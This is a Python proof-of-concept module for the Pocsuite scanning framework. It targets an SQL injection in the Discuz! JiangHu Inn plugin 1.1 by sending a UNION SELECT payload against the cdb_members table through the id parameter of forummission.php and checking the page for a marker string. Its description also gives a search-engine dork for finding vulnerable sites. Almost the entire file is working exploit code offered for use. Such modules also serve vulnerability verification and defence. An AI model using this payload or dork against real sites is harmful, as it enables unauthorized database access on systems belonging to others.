#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = 'SSV-12193'  # vul ID
    version = '1'
    author = ['hh']
    vulDate = '2009-09-02'
    createDate = '2015-10-21'
    updateDate = '2015-10-21'
    references = ['https://www.exploit-db.com/exploits/9576/']
    name = 'Discuz! Plugin JiangHu <= 1.1 (id) SQL Injection Vulnerability'
    appPowerLink = 'www.discuz.net'
    appName = 'Discuz! Plugin JiangHu Inn'
    appVersion = '1.1'
    vulType = 'SQL Injection'
    desc = '''
        Discuz!中的JiangHu Inn plugin 1.1及其早期版本中存在SQL注入漏洞，
        远程攻击者可以借助 forummission.php的显示操作中的id参数执行任意SQL指令。
        d0rk    : inurl:forummission.php
    '''
    # the sample sites for examine
    samples = ['']

    def _verify(self):
        result = {}
        target_url =  "/forummission.php?index=show&id=24 and+1=2+union+select+1,2,concat(0x7162787671,0x50664e68584e4c584352,0x716a717171),4,5,6,7,8,9,10,11 from cdb_members--"
        response = req.get(self.url + target_url, headers=self.headers, timeout=10)
        content = response.content     
        match = re.search('qbxvqPfNhXNLXCRqjqqq',content)
        #拼接一个特殊字符串，验证concat函数是否成功执行
        if match:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + target_url
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet Nothing returned')
        return output

register(TestPOC)